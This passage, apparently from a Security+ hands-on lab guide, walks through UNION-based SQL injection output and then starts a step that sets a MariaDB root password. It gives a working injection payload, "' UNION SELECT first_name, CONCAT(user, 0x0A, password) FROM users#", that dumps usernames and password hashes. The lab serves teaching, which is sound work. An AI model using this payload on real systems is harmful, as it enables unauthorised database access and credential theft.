output displays the maximum character length for each field.

Without the 0x0A, the datatype **int** would have immediately followed the column name, user_id, and the output would have looked messy:

```
First name: user_idint
Surname:
```

With the 0x0A, the output is much cleaner.

```
First name: user_id
int
Surname:
```

As it turns out, there is no character maximum length defined for the user_id column, which is why the Surname: output is blank.
However, from the following output, you can see that the first_name column has a character maximum length of 15, shown in the Surname: output.

```
First name: first_name
varchar
Surname: 15
```

Also notice that last_name and user each have a maximum character length of 15, password has a maximum character length of 32, and avatar has a maximum character length of 70, while the last two fields, last_login and failed_login don’t have a maximum character length.

If you want more than three values outputted, add additional instances of 0x0A and arguments to **CONCAT()**.

+   o. Dump the user first name, username, and password hash for all users:

```
' UNION SELECT first_name, CONCAT(user, 0x0A, password) FROM users#
```

10

# Step 10 Let’s secure the MariaDB root account now with a password. Enter the following in the MariaDB console:

```
SET PASSWORD FOR 'root'@'localhost' =
PASSWORD('CompTIA_Security+');
```